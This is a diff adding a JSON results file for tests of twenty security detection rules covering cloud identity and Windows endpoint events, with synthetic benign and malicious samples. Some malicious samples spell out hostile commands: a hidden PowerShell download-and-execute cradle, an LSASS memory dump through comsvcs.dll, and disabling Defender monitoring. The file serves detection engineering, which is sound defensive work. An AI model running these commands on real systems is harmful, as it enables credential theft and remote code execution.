@@ -1,0 +1,1237 @@
+{
+  "summary": {
+    "pass_rate": 95.0,
+    "avg_time_to_detect_ms": 0.0,
+    "events_total": 100,
+    "alerts_expected": 28,
+    "alerts_actual": 30
+  },
+  "by_rule": {
+    "RULE-001": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "iam.amazonaws.com"
+              }
+            ],
+            "failed_clause": "eventName eq ['CreateAccessKey']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "iam.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "CreateAccessKey"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate key rotation by approved automation roles"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-002": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": false,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "history",
+                "value": "simulated regression"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "iam.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "AttachUserPolicy"
+              },
+              {
+                "field": "requestParameters.policyArn",
+                "value": "arn:aws:iam::aws:policy/AdministratorAccess"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Intended privilege escalation by IAM administrators",
+        "Approved automation roles attaching policies during provisioning"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-003": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "signin.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "ConsoleLogin"
+              },
+              {
+                "field": "responseElements.ConsoleLogin",
+                "value": "Success"
+              }
+            ],
+            "failed_clause": "additionalEventData.MFAUsed eq ['No']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "signin.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "ConsoleLogin"
+              },
+              {
+                "field": "responseElements.ConsoleLogin",
+                "value": "Success"
+              },
+              {
+                "field": "additionalEventData.MFAUsed",
+                "value": "No"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Accounts that are legitimately exempt from MFA (should be rare)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-004": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Consent to application"
+              }
+            ],
+            "failed_clause": "consentType eq ['AllPrincipals']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Consent to application"
+              },
+              {
+                "field": "consentType",
+                "value": "AllPrincipals"
+              },
+              {
+                "field": "result",
+                "value": "success"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate enterprise application onboarding"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-005": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Add member to role"
+              }
+            ],
+            "failed_clause": "roleName eq ['Global Administrator']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Add member to role"
+              },
+              {
+                "field": "roleName",
+                "value": "Global Administrator"
+              },
+              {
+                "field": "result",
+                "value": "success"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate administrative role assignment"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-006": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "13"
+              },
+              {
+                "field": "TargetObject",
+                "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+              }
+            ],
+            "failed_clause": "Details contains ['\\\\AppData\\\\']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "13"
+              },
+              {
+                "field": "TargetObject",
+                "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+              },
+              {
+                "field": "Details",
+                "value": "\"C:\\Users\\alice\\AppData\\Roaming\\svchost.exe\""
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate software installation or updates"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-007": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "7045"
+              }
+            ],
+            "failed_clause": "ImagePath contains ['\\\\Users\\\\']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "7045"
+              },
+              {
+                "field": "ImagePath",
+                "value": "C:\\Users\\alice\\AppData\\Roaming\\winupdate.exe"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Rare; some legitimate tools may install from user space (should be reviewed)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-008": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4698"
+              }
+            ],
+            "failed_clause": "TaskContent contains ['powershell', 'PowerShell']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4698"
+              },
+              {
+                "field": "TaskContent",
+                "value": "<Command>powershell.exe -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example')</Command>"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate admin automation using scheduled tasks"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-009": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [],
+            "failed_clause": "EventID eq [19, 20, 21]",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "21"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate management tooling using permanent WMI subscriptions"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-010": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "11"
+              }
+            ],
+            "failed_clause": "TargetFilename contains ['\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "11"
+              },
+              {
+                "field": "TargetFilename",
+                "value": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveUpdate.exe"
+              },
+              {
+                "field": "TargetFilename",
+                "value": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveUpdate.exe"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate software creating startup entries"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-011": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "10"
+              },
+              {
+                "field": "TargetImage",
+                "value": "C:\\Windows\\System32\\lsass.exe"
+              }
+            ],
+            "failed_clause": "GrantedAccess contains ['0x1fffff']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "10"
+              },
+              {
+                "field": "TargetImage",
+                "value": "C:\\Windows\\System32\\lsass.exe"
+              },
+              {
+                "field": "GrantedAccess",
+                "value": "0x1fffff"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Security products inspecting LSASS (allowlist required)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-012": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "1"
+              },
+              {
+                "field": "Image",
+                "value": "C:\\Windows\\System32\\rundll32.exe"
+              }
+            ],
+            "failed_clause": "CommandLine contains ['comsvcs.dll', 'MiniDump']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "1"
+              },
+              {
+                "field": "Image",
+                "value": "C:\\Windows\\System32\\rundll32.exe"
+              },
+              {
+                "field": "CommandLine",
+                "value": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 632 C:\\Users\\alice\\AppData\\Local\\Temp\\lsass.dmp full"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Rare; some admin tooling may use rundll32 (review)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-013": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": false,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "history",
+                "value": "simulated regression"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4662"
+              },
+              {
+                "field": "Properties",
+                "value": "Replicating Directory Changes All"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Domain controller operations and legitimate replication tooling"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-014": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [],
+            "failed_clause": "eventType eq ['user.mfa.okta_verify.push_rejected']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventType",
+                "value": "user.mfa.okta_verify.push_rejected"
+              },
+              {
+                "field": "outcome.result",
+                "value": "FAILURE"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "User legitimately rejecting unexpected push prompts"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-015": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Sign-in risk detected"
+              }
+            ],
+            "failed_clause": "riskEventTypes contains ['impossibleTravel']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "activityDisplayName",
+                "value": "Sign-in risk detected"
+              },
+              {
+                "field": "riskEventTypes",
+                "value": "impossibleTravel;anomalousToken"
+              },
+              {
+                "field": "riskLevel",
+                "value": "high"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "VPN usage or mobile carrier IP changes"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-016": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [],
+            "failed_clause": "EventID eq [1102]",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "1102"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Rare; legitimate log maintenance (should be controlled)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-017": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4104"
+              }
+            ],
+            "failed_clause": "ScriptBlockText contains ['DisableRealtimeMonitoring']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4104"
+              },
+              {
+                "field": "ScriptBlockText",
+                "value": "Set-MpPreference -DisableRealtimeMonitoring 1"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Approved security tooling changes (change control)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-018": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4104"
+              }
+            ],
+            "failed_clause": "ScriptBlockText contains ['-enc', 'EncodedCommand']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "4104"
+              },
+              {
+                "field": "ScriptBlockText",
+                "value": "powershell -EncodedCommand SQBFAFgAIA=="
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Some admin scripts may use encoded content (rare; review)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-019": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "s3.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "GetObject"
+              }
+            ],
+            "failed_clause": "bytesTransferredOut gte [50000000]",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 1,
+          "actual_alerts": 1,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "eventSource",
+                "value": "s3.amazonaws.com"
+              },
+              {
+                "field": "eventName",
+                "value": "GetObject"
+              },
+              {
+                "field": "bytesTransferredOut",
+                "value": "75000000"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate large downloads (backup/restore, data science workloads)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.ip_ranges",
+          "description": "Exclude trusted corporate egress ranges to reduce noise.",
+          "default": "[]"
+        }
+      ]
+    },
+    "RULE-020": {
+      "tests": [
+        {
+          "case": "benign",
+          "events": 3,
+          "expected_alerts": 0,
+          "actual_alerts": 0,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "22"
+              }
+            ],
+            "failed_clause": "QueryName endswith ['.zip']",
+            "missing_fields": []
+          }
+        },
+        {
+          "case": "malicious",
+          "events": 2,
+          "expected_alerts": 2,
+          "actual_alerts": 2,
+          "time_to_detect_ms": 0,
+          "passed": true,
+          "why": {
+            "matched_fields": [
+              {
+                "field": "EventID",
+                "value": "22"
+              },
+              {
+                "field": "QueryName",
+                "value": "login-security.zip"
+              }
+            ],
+            "failed_clause": null,
+            "missing_fields": []
+          }
+        }
+      ],
+      "false_positive_notes": [
+        "Legitimate use of .zip domains (rare; review)"
+      ],
+      "tuning_knobs": [
+        {
+          "name": "allowlist.principal",
+          "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+          "default": "[]"
+        },
+        {
+          "name": "allowlist.hosts",
+          "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+          "default": "[]"
+        }
+      ]
+    }
+  }
+}
